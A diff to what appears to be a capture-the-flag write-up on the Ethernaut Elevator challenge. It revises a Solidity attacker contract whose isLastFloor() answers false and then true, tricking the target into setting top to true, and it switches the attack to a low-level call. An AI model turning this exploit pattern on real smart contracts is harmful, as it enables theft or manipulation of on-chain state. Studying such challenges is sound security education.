@@ -407,25 +407,16 @@ The attack succeeds because the contract doesn't verify if isLastFloor() gives c
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IElevator {
-    function goTo(uint _floor) external;
-}
-
 contract FakeBuilding {
     bool private toggle;
-    IElevator public elevator;
-
-    constructor(address _elevator) {
-        elevator = IElevator(_elevator);
-    }
 
     function isLastFloor(uint) external returns (bool) {
         toggle = !toggle;
         return toggle; // First call: false, Second call: true
     }
 
-    function attack(uint floor) public {
-        elevator.goTo(floor);
+    function attack(address target, uint floor) public {
+        target.call(abi.encodeWithSignature("goTo(uint256)",floor));
     }
 }
 ```
